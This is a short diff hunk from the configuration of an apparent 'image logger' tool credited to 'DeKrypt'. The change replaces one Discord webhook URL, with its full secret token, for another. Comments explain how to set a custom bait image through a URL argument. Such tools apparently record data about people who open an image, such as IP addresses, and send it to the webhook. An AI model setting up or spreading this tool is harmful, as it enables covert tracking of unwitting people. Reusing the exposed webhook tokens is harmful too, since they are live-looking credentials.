@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFI4558/jFbuUhQVCGAHTa3joABs-EjpY0MFSPLC2-BTvz1JCkzFtFyCR-ZDxJMekN2mDXdE9gJxG #
-    "webhook": "https://discord.com/api/webhooks/1376504397294600312/P3jpo7Ju7WrVRNv1prP0oAJUJo2owCdN0RuuJ9Gjh_eOEibD39mruCJ1mKuQ-eILEz7I",
+    "webhook": "https://discord.com/api/webhooks/1376615957748781076/EZ7Oi6E5jBJVQoSH0bFb3istglKUGhnzoIWvfw9fPDWxKB0v_SVrPyA4PVWlP7pbpb7Y",
     "image": "https://i.postimg.cc/Vs2fGYSV/Picsart-25-05-26-01-11-02-969-ezgif-com-webp-to-png-converter.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
